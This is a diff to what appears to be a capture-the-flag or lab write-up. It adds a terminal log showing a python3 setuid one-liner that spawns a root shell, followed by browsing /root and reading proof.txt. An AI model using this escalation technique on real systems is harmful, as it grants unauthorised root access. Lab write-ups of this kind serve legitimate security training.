@@ -111,5 +111,24 @@ For privilege escalation, pay attention to the output of tools such as linpeas.
 
 ### Proof 
 ![Results!](screenshots/proof.png)
+```
+app@ubuntu:/tmp$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@ubuntu:/tmp# id
+id
+uid=0(root) gid=1000(app) groups=1000(app)
+root@ubuntu:/tmp# cd ..
+cd ..
+root@ubuntu:/# ls
+ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
+boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
+root@ubuntu:/# cd root
+cd root
+root@ubuntu:/root# ls
+ls
+email3.txt  proof.txt  snap
+root@ubuntu:/root# cat proof.txt
 
+```
 
